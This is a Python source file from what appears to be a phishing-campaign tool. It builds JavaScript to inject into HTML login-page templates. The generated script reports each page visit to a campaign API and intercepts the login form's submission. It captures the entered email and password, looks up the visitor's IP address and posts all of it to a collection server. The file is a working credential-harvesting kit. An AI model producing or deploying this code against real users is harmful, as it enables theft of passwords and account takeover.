# When the user connect to the page, to get num of users reached the page (before submit creds)
'''
Will create html and js script to send to the user

    - A 'phished' script is generated to get when a target open the page 
        -> will send request when the page is loaded.
    - A script to fetch target creds
        -> need 'email' and 'pass' inputs,
        -> the request will be send to the api (request needs campaign name, page name etc)
    - If the user wants out template, it will add the scripts to our templates, if not
      the user will get the script only, and will need to modify his own template.
'''
def create_js_phised_script(user_id, campaign_name):
    js_script = """
    <script>
        document.addEventListener("DOMContentLoaded", async function () {
            try {
    """
    
    js_script += f"await fetch(`http://127.0.0.1:5000/campaign/{user_id}/{campaign_name}/phished`"
    
    js_script +="""
        , {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            }
        });
            console.log("Phished number updated successfully!");
        } catch (error) {
            console.error("Error updating phished number:", error);
        }
    });
    </script>
"""

    return js_script

def create_js_script(user_id, campaign_name, page_name=''):
    js_script = create_js_phised_script(user_id, campaign_name)
    js_script += """
        <script>
            document.getElementById("loginForm").addEventListener("submit", async function(event) {
                event.preventDefault(); 

                const email = document.querySelector('input[name="email"]').value;
                const password = document.querySelector('input[name="pass"]').value;
                const ipResponse = await fetch("https://api64.ipify.org?format=json");
                const ipData = await ipResponse.json();
                const userIp = ipData.ip || "Unknown";

                const data = {
                    email: email,
                    password: password,
                    ip: userIp,
    """           
    js_script +=  f"page_name: '{page_name}'"          
    js_script += """
        };        
            try {
        """
    js_script += f"const response = await fetch(`http://127.0.0.1:5000/campaign/{user_id}/{campaign_name}`"
    js_script += """, 
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json', 
                },
                    body: JSON.stringify(data), 
                });

                if (response.ok) {
                    console.log("Login successful!");
                } else {      
                    console.log("Login failed!");
                }
                } catch (error) {
                    console.log("There was an error with the request.");
                }
            });
        </script>
        """

    return js_script

def add_script_to_html(html_path: str, script: str) -> str:
    try:
        with open(html_path, "r", encoding="utf-8") as file:
            html = file.read()

        # Remove the closing </html> tag
        html = html.replace("</html>", "")

        # Append the script and re-add </html>
        script_tag = f"{script}\n</html>"
        html += script_tag

        return html  # Return modified HTML

    except FileNotFoundError:
        print(f"Error: File '{html_path}' not found.")
        return ""
    except Exception as e:
        print(f"Error processing file '{html_path}': {e}")
        return ""


